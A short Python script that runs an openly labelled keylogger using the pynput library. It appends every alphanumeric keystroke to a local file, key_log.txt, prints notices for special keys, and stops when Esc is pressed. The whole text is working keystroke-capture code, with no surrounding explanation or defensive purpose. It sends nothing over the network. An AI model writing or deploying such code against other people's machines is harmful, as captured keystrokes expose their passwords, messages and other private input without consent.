from pynput import keyboard

# Log file to store only alphabets and numbers
LOG_FILE = "key_log.txt"

# Function to handle key press
def on_press(key):
    try:
        # Check if the pressed key is an alphabet or number
        if key.char.isalnum():  # Check if key is alphanumeric
            with open(LOG_FILE, "a") as log_file:
                log_file.write(key.char)  # Log the key
        else:
            print(f"Ignored non-alphanumeric key: {key}")
    except AttributeError:
        # Ignore special keys like Shift, Ctrl, etc.
        print(f"Ignored special key: {key}")

# Function to handle key release (optional, can terminate with Esc)
def on_release(key):
    if key == keyboard.Key.esc:  # Stop the keylogger when Esc is pressed
        print("Exiting keylogger...")
        return False

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger is running. Press Esc to exit.")
    listener.join()
